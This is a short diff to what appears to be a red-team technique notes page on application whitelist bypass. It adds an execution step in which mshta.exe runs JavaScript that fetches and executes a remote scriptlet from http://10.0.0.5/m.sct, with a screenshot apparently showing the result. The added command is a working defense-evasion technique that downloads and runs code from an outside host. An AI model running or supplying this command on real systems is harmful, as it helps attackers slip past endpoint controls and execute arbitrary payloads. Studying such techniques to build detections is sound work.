@@ -9,7 +9,7 @@ description: Application whitelist bypass technique
 ## Code
 
 {% code-tabs %}
-{% code-tabs-item title="m.sct" %}
+{% code-tabs-item title="http://10.0.0.5/m.sct" %}
 ```markup
 <?XML version="1.0"?>
 <scriptlet>
@@ -30,4 +30,15 @@ description: Application whitelist bypass technique
 ```
 {% endcode-tabs-item %}
 {% endcode-tabs %}
+
+## Execution
+
+```bash
+# from powershell
+/cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
+```
+
+## Observations
+
+![](../.gitbook/assets/mshta-calc.png)
 
